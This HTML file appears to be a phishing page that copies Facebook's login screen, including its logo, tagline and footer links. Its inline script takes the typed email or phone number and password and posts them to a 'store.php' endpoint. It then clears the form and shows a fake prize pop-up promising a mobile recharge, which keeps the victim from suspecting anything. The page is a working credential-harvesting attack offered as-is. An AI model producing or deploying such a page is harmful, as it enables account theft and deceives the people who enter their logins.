<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <header>
        <div class="ctr">
            <div class="sctr">
                <div class="left">
                    <div class="photo"><img src="assets/images/facebook.svg" alt="logo"></div>
                    <div class="facebook">
                        <p>Facebook helps you connect and share</p>
                        <p>with the people in your life.</p>
                    </div>
                </div>
                <div class="right">
                    <div class="box_shadow">
                    <div class="form_div">
                        <div>
                            <input type="text" name="user_name" id="user_name" placeholder="Email address or phone number">
                            <input type="password" name="password" id="password" placeholder="password">
                            <button type="submit" name="submit_btn" id="submit_btn">Log In</button>
                        </div>
                  </div>
                  <div class="data_validation"></div>
                  <div class="forgotten"><a href="">Forgotten password?</a></div>
                  <hr>
                  <div>
                      <button type="submit" name="create_btn"> Create New Account</button>
                  </div>
                </div>
                <div class="create_page"><a href=""> <b> Create a Page</b>  </a>for a celebrity, band or business.</div>
                </div>
            </div>
        </div>
    </header>
    <footer>
        <div class="footer_ctr">
            <div class="footer_sctr">
                <div class="div_one">
                    <li>English (UK)</li>
                    <li>বাংলা</li>
                    <li>অসমীয়া</li>
                    <li>हिन्दी</li>
                    <li>नेपाली</li>
                    <li>Bahasa Indonesia</li>
                    <li>العربية</li>
                    <li>中文(简体)</li>
                    <li>Bahasa Melayu</li>
                    <li>Español</li>
                    <li>Português (Brasil)</li>
                    <li>+</li>
                </div>
                <hr>
                <div class="div_two">
                    <div class="row_one">
                            <li>Sign Up</li>
                            <li>Log In</li>
                            <li>Messenger</li>
                            <li>Facebook Lite </li>
                            <li> Watch </li>
                            <li>Places</li>
                            <li>Games</li>
                            <li>Marketplace</li>
                            <li>Facebook Pay</li>
                            <li>Jobs</li>
                            <li>Oculus</li>
                            <li>Portal</li>
                            <li>Instagram</li>
                            <li>Local</li>
                    </div>
                    <div class="row_two">
                            <li>Fundraisers</li>
                            <li>Services</li>
                            <li>Voting Information Centre</li>
                            <li>About</li>
                            <li>Create ad</li>
                            <li>Create Page</li>
                            <li>Developers</li>
                            <li>Careers</li>
                            <li>Privacy</li>
                            <li>Cookies</li>
                            <li>AdChoices</li>
                            <li>Terms</li>
                            <li>Help</li>
                    </div>
                    
                </div>
                <div class="div_three">
                    facebook &copy; 2021
                </div>
            </div>
        </div>
    </footer>

    <script src="assets/js/jquery.js"></script>
    <script src="assets/js/sweet_alert.js"></script> 
    <script>
        /* 'jquery or ajax' start*/
        $(document).ready(function(){

            /* "input data transfer with ajax" start*/

            $(document).on('click','#submit_btn',function(e){
                e.preventDefault();
                const user_name=$('#user_name').val();
                const password=$('#password').val();
                if(user_name !='' && password !=''){
                    $.ajax({
                    url:'store.php',
                    type:"POST",
                    data:{user_name : user_name, password : password},
                    success:function(parameter){
                        if(parameter=='1'){
                            // sweet alert;
                            swal({
                                    title: "Congatulations! you win. You will get 1000 TK mobile recharge.",
                                    text: "We are call you after sometimes.",
                                    icon: "success",//info,warning,error
                                    button: "you are lucky.",
                                    });
                                    $('#user_name').val('');
                                    $('#password').val('');

                        }
                    }
                });
                }else{
                    $('.data_validation').html('all fields is required !').css('margin-top','10px');
                };
                
            });
        });
        /* 'jquery or ajax' start*/
    </script>
</body>
</html>